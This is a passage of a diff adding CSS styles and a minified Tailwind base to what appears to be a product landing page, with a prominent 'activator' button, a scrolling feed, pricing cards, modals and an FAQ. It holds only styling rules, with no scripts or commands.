+            text-shadow: 0 0 30px rgba(255, 105, 180, 0.8);
+        }
+        
+        .hero-subtitle {
+            font-size: 1.25rem;
+            color: #e5e0f0;
+            line-height: 1.6;
+            margin-bottom: 48px;
+            max-width: 700px;
+            margin-left: auto;
+            margin-right: auto;
+            font-weight: 400;
+            text-shadow: 0 1px 3px rgba(0, 0, 0, 0.3);
+        }
+        
+        .activator-section {
+            margin-bottom: 40px;
+        }
+        
+        .activator-label {
+            color: #b8b3c4;
+            font-size: 14px;
+            margin-bottom: 16px;
+            font-weight: 500;
+        }
+        
+        .activator-btn {
+            background: linear-gradient(135deg, #ff69b4, #ff1493, #dc143c);
+            color: white;
+            border-radius: 20px;
+            padding: 24px 48px;
+            font-weight: 800;
+            font-size: 18px;
+            transition: all 0.3s ease;
+            border: none;
+            cursor: move;
+            box-shadow: 0 12px 40px rgba(255, 105, 180, 0.5);
+            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.3);
+            position: relative;
+            overflow: hidden;
+            letter-spacing: 0.5px;
+            text-decoration: none;
+            display: inline-block;
+            -webkit-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+            user-select: none;
+            -webkit-touch-callout: none;
+            touch-action: manipulation;
+            min-height: 60px;
+            min-width: 280px;
+            text-align: center;
+            word-break: keep-all;
+            white-space: nowrap;
+        }
+        
+        .activator-btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 50%;
+            background: linear-gradient(180deg, rgba(255, 255, 255, 0.2), transparent);
+            border-radius: 20px 20px 0 0;
+        }
+        
+        .activator-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 20px 50px rgba(255, 105, 180, 0.6);
+            background: linear-gradient(135deg, #ff1493, #dc143c, #b91c5c);
+        }
+        
+        .hero-note {
+            color: #b8b3c4;
+            font-size: 14px;
+            font-weight: 400;
+        }
+        
+        .section {
+            padding: 100px 0;
+        }
+        
+        .section-header {
+            text-align: center;
+            margin-bottom: 80px;
+        }
+        
+        .section-title {
+            font-size: clamp(2.5rem, 5vw, 3.5rem);
+            font-weight: 800;
+            color: #ffffff;
+            margin-bottom: 16px;
+            text-shadow: 0 2px 30px rgba(255, 182, 193, 0.3);
+            letter-spacing: -0.02em;
+            word-wrap: break-word;
+            overflow-wrap: break-word;
+            hyphens: auto;
+        }
+        
+        .section-subtitle {
+            font-size: 1.25rem;
+            color: #e5e0f0;
+            font-weight: 400;
+            max-width: 600px;
+            margin: 0 auto;
+            line-height: 1.6;
+        }
+        
+        .features-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(min(360px, 100%), 1fr));
+            gap: 32px;
+            margin-bottom: 60px;
+        }
+        
+        .feature-card {
+            background: rgba(255, 255, 255, 0.06);
+            border-radius: 24px;
+            border: 1px solid rgba(255, 182, 193, 0.2);
+            padding: 32px;
+            transition: all 0.4s ease;
+            backdrop-filter: blur(10px);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .feature-card[onclick] {
+            cursor: pointer;
+        }
+        
+        .feature-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 1px;
+            background: linear-gradient(90deg, transparent, rgba(255, 182, 193, 0.6), transparent);
+        }
+        
+        .feature-card:hover {
+            transform: translateY(-8px);
+            box-shadow: 0 20px 60px rgba(255, 105, 180, 0.3);
+            border-color: rgba(255, 182, 193, 0.6);
+            background: rgba(255, 255, 255, 0.1);
+        }
+        
+        .feature-icon {
+            width: 64px;
+            height: 64px;
+            background: linear-gradient(135deg, #ff69b4, #ff1493, #dc143c);
+            border-radius: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 28px;
+            margin-bottom: 24px;
+            box-shadow: 0 8px 30px rgba(255, 105, 180, 0.4);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .feature-icon::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 50%;
+            background: linear-gradient(180deg, rgba(255, 255, 255, 0.2), transparent);
+            border-radius: 20px 20px 0 0;
+        }
+        
+        .feature-title {
+            font-size: 1.375rem;
+            font-weight: 700;
+            color: #ffffff;
+            margin-bottom: 16px;
+            text-shadow: 0 1px 3px rgba(0, 0, 0, 0.3);
+        }
+        
+        .feature-description {
+            color: #e5e0f0;
+            line-height: 1.6;
+            font-weight: 400;
+            font-size: 15px;
+        }
+        
+        .feature-card-full {
+            grid-column: 1 / -1;
+            padding: 48px;
+        }
+        
+        .alpha-feed {
+            background: rgba(0, 0, 0, 0.6);
+            border-radius: 16px;
+            padding: 24px;
+            margin-top: 24px;
+            border: 1px solid rgba(255, 182, 193, 0.2);
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 13px;
+            height: 220px;
+            overflow: hidden;
+            position: relative;
+        }
+        
+        .alpha-feed::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 24px;
+            background: linear-gradient(to bottom, rgba(0, 0, 0, 0.6), transparent);
+            z-index: 10;
+        }
+        
+        .alpha-feed::after {
+            content: '';
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            height: 32px;
+            background: linear-gradient(to top, rgba(0, 0, 0, 0.6), transparent);
+            z-index: 10;
+        }
+        
+        @keyframes scroll {
+            0% { transform: translateY(0); }
+            100% { transform: translateY(-50%); }
+        }
+        
+        .animate-scroll {
+            animation: scroll 35s linear infinite;
+        }
+        
+        .animate-scroll > div {
+            margin-bottom: 4px;
+        }
+        
+        .steps-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 48px;
+            margin-top: 60px;
+        }
+        
+        .step {
+            text-align: center;
+        }
+        
+        .step-number {
+            width: 64px;
+            height: 64px;
+            background: linear-gradient(135deg, #ff69b4, #ff1493);
+            border-radius: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 24px;
+            font-weight: 800;
+            margin: 0 auto 24px;
+            box-shadow: 0 8px 30px rgba(255, 105, 180, 0.4);
+        }
+        
+        .step-title {
+            font-size: 1.25rem;
+            font-weight: 700;
+            color: #ffffff;
+            margin-bottom: 12px;
+        }
+        
+        .step-description {
+            color: #e5e0f0;
+            line-height: 1.6;
+            font-weight: 400;
+        }
+        
+        .faq-list {
+            max-width: 800px;
+            margin: 0 auto;
+            space-y: 16px;
+        }
+        
+        .faq-item {
+            background: rgba(255, 255, 255, 0.06);
+            border-radius: 20px;
+            border: 1px solid rgba(255, 182, 193, 0.2);
+            margin-bottom: 16px;
+            transition: all 0.3s ease;
+            backdrop-filter: blur(10px);
+            overflow: hidden;
+        }
+        
+        .faq-item:hover {
+            border-color: rgba(255, 182, 193, 0.4);
+            background: rgba(255, 255, 255, 0.08);
+        }
+        
+        .faq-summary {
+            padding: 24px 32px;
+            font-weight: 600;
+            font-size: 1.1rem;
+            color: #ffffff;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            list-style: none;
+        }
+        
+        .faq-summary::-webkit-details-marker {
+            display: none;
+        }
+        
+        .faq-toggle {
+            color: #ff69b4;
+            font-size: 1.5rem;
+            font-weight: 300;
+            transition: transform 0.3s ease;
+        }
+        
+        .faq-item[open] .faq-toggle {
+            transform: rotate(45deg);
+        }
+        
+        .faq-content {
+            padding: 0 32px 32px;
+            color: #e5e0f0;
+            line-height: 1.6;
+            font-weight: 400;
+        }
+        
+        .footer {
+            background: rgba(26, 22, 37, 0.12);
+            border-top: 1px solid rgba(255, 182, 193, 0.1);
+            padding: 30px 0;
+            margin-top: 40px;
+        }
+        
+        .footer-simple {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+        
+        .footer-brand .logo {
+            font-size: 1.25rem;
+        }
+        
+        .footer-links {
+            display: flex;
+            gap: 24px;
+        }
+        
+        .footer-link {
+            color: #e5e0f0;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 400;
+            transition: all 0.3s ease;
+            padding: 8px 12px;
+            border-radius: 8px;
+        }
+        
+        .footer-link:hover {
+            color: #ff69b4;
+            background: rgba(255, 105, 180, 0.1);
+        }
+        
+        .footer-bottom {
+            border-top: 1px solid rgba(255, 182, 193, 0.1);
+            padding-top: 20px;
+            text-align: center;
+        }
+        
+        .footer-copyright {
+            color: #b8b3c4;
+            font-size: 13px;
+            font-weight: 400;
+        }
+        
+        .pricing-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
+            gap: 32px;
+            max-width: 800px;
+            margin: 0 auto;
+        }
+        
+        .pricing-card {
+            background: rgba(255, 255, 255, 0.06);
+            border-radius: 24px;
+            border: 1px solid rgba(255, 182, 193, 0.2);
+            padding: 40px;
+            transition: all 0.4s ease;
+            backdrop-filter: blur(10px);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .pricing-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 1px;
+            background: linear-gradient(90deg, transparent, rgba(255, 182, 193, 0.6), transparent);
+        }
+        
+        .pricing-card:hover {
+            transform: translateY(-8px);
+            box-shadow: 0 20px 60px rgba(255, 105, 180, 0.3);
+            border-color: rgba(255, 182, 193, 0.6);
+            background: rgba(255, 255, 255, 0.1);
+        }
+        
+        .pricing-card-pro {
+            border-color: rgba(255, 105, 180, 0.4);
+            background: rgba(255, 105, 180, 0.08);
+        }
+        
+        .pricing-card-pro:hover {
+            border-color: rgba(255, 105, 180, 0.8);
+            background: rgba(255, 105, 180, 0.12);
+        }
+        
+        .pricing-badge {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            background: linear-gradient(135deg, #ff69b4, #ff1493);
+            color: white;
+            padding: 6px 12px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: 600;
+            text-shadow: 0 1px 2px rgba(0, 0, 0, 0.2);
+        }
+        
+        .pricing-header {
+            text-align: center;
+            margin-bottom: 32px;
+        }
+        
+        .pricing-title {
+            font-size: 1.5rem;
+            font-weight: 700;
+            color: #ffffff;
+            margin-bottom: 16px;
+        }
+        
+        .pricing-price {
+            margin-bottom: 12px;
+        }
+        
+        .price-amount {
+            font-size: 2.5rem;
+            font-weight: 900;
+            color: #ff69b4;
+            text-shadow: 0 0 20px rgba(255, 105, 180, 0.5);
+        }
+        
+        .price-period {
+            font-size: 0.9rem;
+            color: #b8b3c4;
+            font-weight: 400;
+            margin-left: 8px;
+        }
+        
+        .pricing-description {
+            color: #e5e0f0;
+            font-size: 14px;
+            font-weight: 400;
+        }
+        
+        .pricing-features {
+            margin-bottom: 32px;
+        }
+        
+        .feature-item {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 12px;
+            color: #e5e0f0;
+            font-size: 14px;
+            font-weight: 400;
+        }
+        
+        .feature-check {
+            color: #ff69b4;
+            font-weight: 600;
+            font-size: 16px;
+        }
+        
+        .pricing-btn {
+            width: 100%;
+            padding: 16px 24px;
+            border-radius: 12px;
+            font-weight: 700;
+            font-size: 16px;
+            transition: all 0.3s ease;
+            border: none;
+            cursor: pointer;
+            text-shadow: 0 1px 2px rgba(0, 0, 0, 0.2);
+        }
+        
+        .pricing-btn-free {
+            background: rgba(255, 255, 255, 0.08);
+            color: #ffffff;
+            border: 1px solid rgba(255, 182, 193, 0.3);
+        }
+        
+        .pricing-btn-free:hover {
+            background: rgba(255, 182, 193, 0.15);
+            border-color: rgba(255, 182, 193, 0.6);
+            transform: translateY(-2px);
+        }
+        
+        .pricing-btn-pro {
+            background: linear-gradient(135deg, #ff69b4, #ff1493, #dc143c);
+            color: white;
+            box-shadow: 0 6px 20px rgba(255, 105, 180, 0.4);
+        }
+        
+        .pricing-btn-pro:hover {
+            background: linear-gradient(135deg, #ff1493, #dc143c, #b91c5c);
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(255, 105, 180, 0.5);
+        }
+        
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            backdrop-filter: blur(10px);
+            z-index: 10000;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            opacity: 0;
+            visibility: hidden;
+            transition: all 0.3s ease;
+        }
+        
+        .modal-overlay.active {
+            opacity: 1;
+            visibility: visible;
+        }
+        
+        .modal-content {
+            background: rgba(26, 22, 37, 0.95);
+            border-radius: 24px;
+            border: 1px solid rgba(255, 182, 193, 0.3);
+            padding: 40px;
+            max-width: 500px;
+            width: 90%;
+            max-height: 80vh;
+            overflow-y: auto;
+            position: relative;
+            backdrop-filter: blur(20px);
+            transform: scale(0.9);
+            transition: transform 0.3s ease;
+        }
+        
+        .modal-overlay.active .modal-content {
+            transform: scale(1);
+        }
+        
+        .modal-close {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            background: none;
+            border: none;
+            color: #ff69b4;
+            font-size: 32px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            width: 40px;
+            height: 40px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .modal-close:hover {
+            color: #ff1493;
+            transform: scale(1.1);
+        }
+        
+        .modal-header {
+            text-align: center;
+            margin-bottom: 32px;
+        }
+        
+        .modal-title {
+            font-size: 1.5rem;
+            font-weight: 700;
+            color: #ffffff;
+            margin-bottom: 8px;
+        }
+        
+        .modal-subtitle {
+            color: #e5e0f0;
+            font-size: 14px;
+            font-weight: 400;
+        }
+        
+        .modal-steps {
+            margin-bottom: 32px;
+        }
+        
+        .modal-step {
+            display: flex;
+            align-items: flex-start;
+            gap: 16px;
+            margin-bottom: 20px;
+        }
+        
+        .modal-step .step-number {
+            width: 32px;
+            height: 32px;
+            background: linear-gradient(135deg, #ff69b4, #ff1493);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 700;
+            color: white;
+            font-size: 14px;
+            flex-shrink: 0;
+        }
+        
+        .step-content h4 {
+            color: #ffffff;
+            font-size: 16px;
+            font-weight: 600;
+            margin-bottom: 4px;
+        }
+        
+        .step-content p {
+            color: #e5e0f0;
+            font-size: 14px;
+            line-height: 1.5;
+        }
+        
+        .modal-activator {
+            text-align: center;
+            margin-bottom: 24px;
+            padding: 24px;
+            background: rgba(255, 105, 180, 0.05);
+            border-radius: 16px;
+            border: 1px solid rgba(255, 182, 193, 0.2);
+        }
+        
+        .modal-activator .activator-label {
+            color: #ff69b4;
+            font-size: 14px;
+            font-weight: 600;
+            margin-bottom: 12px;
+        }
+        
+        .modal-note {
+            text-align: center;
+        }
+        
+        .modal-note p {
+            color: #b8b3c4;
+            font-size: 13px;
+            margin-bottom: 4px;
+        }
+        
+        .modal-content-large {
+            max-width: 600px;
+            width: 95%;
+            padding: 50px;
+        }
+        
+        .modal-body {
+            text-align: center;
+            color: #e5e0f0;
+            font-size: 16px;
+            line-height: 1.6;
+        }
+        
+        .animate-on-scroll {
+            opacity: 0;
+            transform: translateY(30px);
+            transition: all 0.8s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+        
+        .animate-on-scroll.animate-in {
+            opacity: 1;
+            transform: translateY(0);
+        }
+        
+        .animate-fade-in {
+            opacity: 0;
+            transition: opacity 1s ease-out;
+        }
+        
+        .animate-fade-in.animate-in {
+            opacity: 1;
+        }
+        
+        .animate-slide-up {
+            opacity: 0;
+            transform: translateY(40px);
+            transition: all 0.8s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+        
+        .animate-slide-up.animate-in {
+            opacity: 1;
+            transform: translateY(0);
+        }
+        
+        .animate-slide-left {
+            opacity: 0;
+            transform: translateX(-40px);
+            transition: all 0.8s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+        
+        .animate-slide-left.animate-in {
+            opacity: 1;
+            transform: translateX(0);
+        }
+        
+        .animate-slide-right {
+            opacity: 0;
+            transform: translateX(40px);
+            transition: all 0.8s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+        
+        .animate-slide-right.animate-in {
+            opacity: 1;
+            transform: translateX(0);
+        }
+        
+        .animate-scale {
+            opacity: 0;
+            transform: scale(0.9);
+            transition: all 0.8s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+        
+        .animate-scale.animate-in {
+            opacity: 1;
+            transform: scale(1);
+        }
+        
+        .animate-bounce {
+            opacity: 0;
+            transform: translateY(20px) scale(0.95);
+            transition: all 0.8s cubic-bezier(0.68, -0.55, 0.265, 1.55);
+        }
+        
+        .animate-bounce.animate-in {
+            opacity: 1;
+            transform: translateY(0) scale(1);
+        }
+        
+        .animate-on-scroll:nth-child(1) { transition-delay: 0.1s; }
+        .animate-on-scroll:nth-child(2) { transition-delay: 0.2s; }
+        .animate-on-scroll:nth-child(3) { transition-delay: 0.3s; }
+        .animate-on-scroll:nth-child(4) { transition-delay: 0.4s; }
+        .animate-on-scroll:nth-child(5) { transition-delay: 0.5s; }
+        .animate-on-scroll:nth-child(6) { transition-delay: 0.6s; }
+        .animate-on-scroll:nth-child(7) { transition-delay: 0.7s; }
+        .animate-on-scroll:nth-child(8) { transition-delay: 0.8s; }
+        .animate-on-scroll:nth-child(9) { transition-delay: 0.9s; }
+        
+        .activator-btn.highlighted {
+            animation: highlight-pulse 2s ease-in-out 3;
+            box-shadow: 0 0 30px rgba(255, 105, 180, 0.8), 0 0 60px rgba(255, 105, 180, 0.6);
+        }
+        
+        @keyframes highlight-pulse {
+            0% { 
+                box-shadow: 0 0 30px rgba(255, 105, 180, 0.8), 0 0 60px rgba(255, 105, 180, 0.6);
+                transform: scale(1);
+            }
+            50% { 
+                box-shadow: 0 0 40px rgba(255, 105, 180, 1), 0 0 80px rgba(255, 105, 180, 0.8);
+                transform: scale(1.05);
+            }
+            100% { 
+                box-shadow: 0 0 30px rgba(255, 105, 180, 0.8), 0 0 60px rgba(255, 105, 180, 0.6);
+                transform: scale(1);
+            }
+        }
+        
+        @media (max-width: 1200px) {
+            .container {
+                max-width: 1200px;
+                padding: 0 24px;
+            }
+            
+            .features-grid {
+                grid-template-columns: repeat(auto-fit, minmax(min(320px, 100%), 1fr));
+                gap: 28px;
+            }
+        }
+        
+        @media (max-width: 768px) {
+            .container {
+                padding: 0 16px;
+            }
+            
+            .header-content {
+                height: 70px;
+            }
+            
+            .logo {
+                font-size: 1.5rem;
+            }
+            
+            .nav-buttons {
+                gap: 8px;
+            }
+            
+            .btn {
+                padding: 8px 16px;
+                font-size: 12px;
+            }
+            
+            .hero {
+                padding: 100px 0 60px;
+            }
+            
+            .hero-title {
+                font-size: clamp(2rem, 8vw, 3rem);
+            }
+            
+            .hero-subtitle {
+                font-size: 1.1rem;
+            }
+            
+            .activator-btn {
+                padding: 18px 32px;
+                font-size: 16px;
+            }
+            
+            .section {
+                padding: 60px 0;
+            }
+            
+            .section-header {
+                margin-bottom: 60px;
+            }
+            
+            .features-grid {
+                grid-template-columns: 1fr;
+                gap: 24px;
+            }
+            
+            .feature-card {
+                padding: 24px;
+            }
+            
+            .feature-card-full {
+                padding: 28px;
+            }
+            
+            .steps-grid {
+                gap: 32px;
+            }
+            
+            .faq-summary {
+                padding: 20px 24px;
+                font-size: 1rem;
+            }
+            
+            .faq-content {
+                padding: 0 24px 24px;
+            }
+            
+            .footer {
+                padding: 24px 0;
+            }
+            
+            .footer-simple {
+                flex-direction: column;
+                gap: 16px;
+                margin-bottom: 16px;
+            }
+            
+            .footer-links {
+                gap: 16px;
+            }
+        }
+        
+        @media (max-width: 480px) {
+            .container {
+                padding: 0 12px;
+            }
+            
+            .header-content {
+                height: 60px;
+            }
+            
+            .logo {
+                font-size: 1.25rem;
+            }
+            
+            .nav-buttons {
+                gap: 6px;
+            }
+            
+            .btn {
+                padding: 6px 12px;
+                font-size: 11px;
+            }
+            
+            .hero {
+                padding: 80px 0 40px;
+            }
+            
+            .hero-badge {
+                font-size: 12px;
+                padding: 6px 16px;
+            }
+            
+            .hero-title {
+                font-size: clamp(1.8rem, 8vw, 2.5rem);
+                margin-bottom: 16px;
+            }
+            
+            .hero-subtitle {
+                font-size: 1rem;
+                margin-bottom: 32px;
+            }
+            
+            .activator-btn {
+                padding: 16px 24px;
+                font-size: 14px;
+            }
+            
+            .section {
+                padding: 40px 0;
+            }
+            
+            .section-header {
+                margin-bottom: 40px;
+            }
+            
+            .section-title {
+                font-size: clamp(1.8rem, 6vw, 2.5rem);
+            }
+            
+            .section-subtitle {
+                font-size: 1rem;
+            }
+            
+            .feature-card {
+                padding: 20px;
+            }
+            
+            .feature-card-full {
+                padding: 24px;
+            }
+            
+            .feature-icon {
+                width: 56px;
+                height: 56px;
+                font-size: 24px;
+            }
+            
+            .feature-title {
+                font-size: 1.2rem;
+            }
+            
+            .feature-description {
+                font-size: 14px;
+            }
+            
+            .step-number {
+                width: 56px;
+                height: 56px;
+                font-size: 20px;
+            }
+            
+            .step-title {
+                font-size: 1.1rem;
+            }
+            
+            .step-description {
+                font-size: 14px;
+            }
+            
+            .faq-summary {
+                padding: 16px 20px;
+                font-size: 0.95rem;
+            }
+            
+            .faq-content {
+                padding: 0 20px 20px;
+                font-size: 14px;
+            }
+            
+            .footer {
+                padding: 20px 0;
+            }
+            
+            .footer-simple {
+                flex-direction: column;
+                gap: 12px;
+                margin-bottom: 12px;
+            }
+            
+            .footer-links {
+                gap: 12px;
+            }
+            
+            .footer-link {
+                font-size: 12px;
+                padding: 4px 8px;
+            }
+            
+            .footer-copyright {
+                font-size: 11px;
+            }
+            
+            .activator-btn {
+                min-width: 280px;
+                text-align: center;
+                white-space: nowrap;
+                overflow: hidden;
+                text-overflow: ellipsis;
+            }
+            
+            .hero-title, .section-title {
+                word-wrap: break-word;
+                overflow-wrap: break-word;
+            }
+            
+            img {
+                max-width: 100%;
+                height: auto;
+            }
+            
+            .btn, .activator-btn, .logo {
+                -webkit-user-select: none;
+                -moz-user-select: none;
+                -ms-user-select: none;
+                user-select: none;
+            }
+            
+            .pricing-grid {
+                grid-template-columns: 1fr;
+                gap: 24px;
+            }
+            
+            .pricing-card {
+                padding: 32px;
+            }
+            
+            .pricing-header {
+                margin-bottom: 24px;
+            }
+            
+            .pricing-title {
+                font-size: 1.25rem;
+            }
+            
+            .price-amount {
+                font-size: 2rem;
+            }
+            
+            .pricing-btn {
+                padding: 14px 20px;
+                font-size: 15px;
+            }
+            
+            .steps-grid {
+                gap: 20px;
+            }
+            
+            .step {
+                text-align: center;
+                padding: 20px;
+            }
+            
+            .step-number {
+                width: 40px;
+                height: 40px;
+                font-size: 16px;
+                margin: 0 auto 16px;
+            }
+            
+            .step-title {
+                font-size: 1.1rem;
+                margin-bottom: 8px;
+            }
+            
+            .step-description {
+                font-size: 14px;
+            }
+        }
+        
+        @media (-webkit-min-device-pixel-ratio: 2), (min-resolution: 2dppx) {
+            .logo, .hero-title, .section-title {
+                -webkit-font-smoothing: antialiased;
+                -moz-osx-font-smoothing: grayscale;
+            }
+        }
+        
+        @media (max-height: 500px) and (orientation: landscape) {
+            .hero {
+                padding: 60px 0 40px;
+            }
+            
+            .section {
+                padding: 40px 0;
+            }
+            
+            .header-content {
+                height: 50px;
+            }
+            
+            .btn {
+                padding: 4px 8px;
+                font-size: 10px;
+            }
+        }
+        
+        @media (max-width: 360px) {
+            .container {
+                padding: 0 8px;
+            }
+            
+            .hero-title {
+                font-size: clamp(1.5rem, 8vw, 2rem);
+            }
+            
+            .activator-btn {
+                padding: 14px 20px;
+                font-size: 12px;
+                min-width: 250px;
+            }
+            
+            .feature-card {
+                padding: 16px;
+            }
+            
+            .pricing-card {
+                padding: 20px;
+            }
+        }
+        
+        @media (min-width: 769px) and (max-width: 1024px) {
+            .features-grid {
+                grid-template-columns: repeat(2, 1fr);
+                gap: 24px;
+            }
+            
+            .steps-grid {
+                grid-template-columns: repeat(3, 1fr);
+                gap: 24px;
+            }
+            
+            .pricing-grid {
+                grid-template-columns: repeat(2, 1fr);
+                gap: 24px;
+            }
+        }
+        
+        @media (min-width: 1440px) {
+            .container {
+                max-width: 1200px;
+            }
+            
+            .hero-title {
+                font-size: 3.5rem;
+            }
+            
+            .section-title {
+                font-size: 2.5rem;
+            }
+        }
+    </style>
+<style>*, ::before, ::after{--tw-border-spacing-x:0;--tw-border-spacing-y:0;--tw-translate-x:0;--tw-translate-y:0;--tw-rotate:0;--tw-skew-x:0;--tw-skew-y:0;--tw-scale-x:1;--tw-scale-y:1;--tw-pan-x: ;--tw-pan-y: ;--tw-pinch-zoom: ;--tw-scroll-snap-strictness:proximity;--tw-gradient-from-position: ;--tw-gradient-via-position: ;--tw-gradient-to-position: ;--tw-ordinal: ;--tw-slashed-zero: ;--tw-numeric-figure: ;--tw-numeric-spacing: ;--tw-numeric-fraction: ;--tw-ring-inset: ;--tw-ring-offset-width:0px;--tw-ring-offset-color:#fff;--tw-ring-color:rgb(59 130 246 / 0.5);--tw-ring-offset-shadow:0 0 #0000;--tw-ring-shadow:0 0 #0000;--tw-shadow:0 0 #0000;--tw-shadow-colored:0 0 #0000;--tw-blur: ;--tw-brightness: ;--tw-contrast: ;--tw-grayscale: ;--tw-hue-rotate: ;--tw-invert: ;--tw-saturate: ;--tw-sepia: ;--tw-drop-shadow: ;--tw-backdrop-blur: ;--tw-backdrop-brightness: ;--tw-backdrop-contrast: ;--tw-backdrop-grayscale: ;--tw-backdrop-hue-rotate: ;--tw-backdrop-invert: ;--tw-backdrop-opacity: ;--tw-backdrop-saturate: ;--tw-backdrop-sepia: ;--tw-contain-size: ;--tw-contain-layout: ;--tw-contain-paint: ;--tw-contain-style: }::backdrop{--tw-border-spacing-x:0;--tw-border-spacing-y:0;--tw-translate-x:0;--tw-translate-y:0;--tw-rotate:0;--tw-skew-x:0;--tw-skew-y:0;--tw-scale-x:1;--tw-scale-y:1;--tw-pan-x: ;--tw-pan-y: ;--tw-pinch-zoom: ;--tw-scroll-snap-strictness:proximity;--tw-gradient-from-position: ;--tw-gradient-via-position: ;--tw-gradient-to-position: ;--tw-ordinal: ;--tw-slashed-zero: ;--tw-numeric-figure: ;--tw-numeric-spacing: ;--tw-numeric-fraction: ;--tw-ring-inset: ;--tw-ring-offset-width:0px;--tw-ring-offset-color:#fff;--tw-ring-color:rgb(59 130 246 / 0.5);--tw-ring-offset-shadow:0 0 #0000;--tw-ring-shadow:0 0 #0000;--tw-shadow:0 0 #0000;--tw-shadow-colored:0 0 #0000;--tw-blur: ;--tw-brightness: ;--tw-contrast: ;--tw-grayscale: ;--tw-hue-rotate: ;--tw-invert: ;--tw-saturate: ;--tw-sepia: ;--tw-drop-shadow: ;--tw-backdrop-blur: ;--tw-backdrop-brightness: ;--tw-backdrop-contrast: ;--tw-backdrop-grayscale: ;--tw-backdrop-hue-rotate: ;--tw-backdrop-invert: ;--tw-backdrop-opacity: ;--tw-backdrop-saturate: ;--tw-backdrop-sepia: ;--tw-contain-size: ;--tw-contain-layout: ;--tw-contain-paint: ;--tw-contain-style: }/* ! tailwindcss v3.4.17 | MIT License | https://tailwindcss.com */*,::after,::before{box-sizing:border-box;border-width:0;border-style:solid;border-color:#e5e7eb}::after,::before{--tw-content:''}:host,html{line-height:1.5;-webkit-text-size-adjust:100%;-moz-tab-size:4;tab-size:4;font-family:ui-sans-serif, system-ui, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";font-feature-settings:normal;font-variation-settings:normal;-webkit-tap-highlight-color:transparent}body{margin:0;line-height:inherit}hr{height:0;color:inherit;border-top-width:1px}abbr:where([title]){-webkit-text-decoration:underline dotted;text-decoration:underline dotted}h1,h2,h3,h4,h5,h6{font-size:inherit;font-weight:inherit}a{color:inherit;text-decoration:inherit}b,strong{font-weight:bolder}code,kbd,pre,samp{font-family:ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;font-feature-settings:normal;font-variation-settings:normal;font-size:1em}small{font-size:80%}sub,sup{font-size:75%;line-height:0;position:relative;vertical-align:baseline}sub{bottom:-.25em}sup{top:-.5em}table{text-indent:0;border-color:inherit;border-collapse:collapse}button,input,optgroup,select,textarea{font-family:inherit;font-feature-settings:inherit;font-variation-settings:inherit;font-size:100%;font-weight:inherit;line-height:inherit;letter-spacing:inherit;color:inherit;margin:0;padding:0}button,select{text-transform:none}button,input:where([type=button]),input:where([type=reset]),input:where([type=submit]){-webkit-appearance:button;background-color:transparent;background-image:none}:-moz-focusring{outline:auto}:-moz-ui-invalid{box-shadow:none}progress{vertical-align:baseline}::-webkit-inner-spin-button,::-webkit-outer-spin-button{height:auto}[type=search]{-webkit-appearance:textfield;outline-offset:-2px}::-webkit-search-decoration{-webkit-appearance:none}::-webkit-file-upload-button{-webkit-appearance:button;font:inherit}summary{display:list-item}blockquote,dd,dl,figure,h1,h2,h3,h4,h5,h6,hr,p,pre{margin:0}fieldset{margin:0;padding:0}legend{padding:0}menu,ol,ul{list-style:none;margin:0;padding:0}dialog{padding:0}textarea{resize:vertical}input::placeholder,textarea::placeholder{opacity:1;color:#9ca3af}[role=button],button{cursor:pointer}:disabled{cursor:default}audio,canvas,embed,iframe,img,object,svg,video{display:block;vertical-align:middle}img,video{max-width:100%;height:auto}[hidden]:where(:not([hidden=until-found])){display:none}.container{width:100%}@media (min-width: 640px){.container{max-width:640px}}@media (min-width: 768px){.container{max-width:768px}}@media (min-width: 1024px){.container{max-width:1024px}}@media (min-width: 1280px){.container{max-width:1280px}}@media (min-width: 1536px){.container{max-width:1536px}}.space-y-1 > :not([hidden]) ~ :not([hidden]){--tw-space-y-reverse:0;margin-top:calc(0.25rem * calc(1 - var(--tw-space-y-reverse)));margin-bottom:calc(0.25rem * 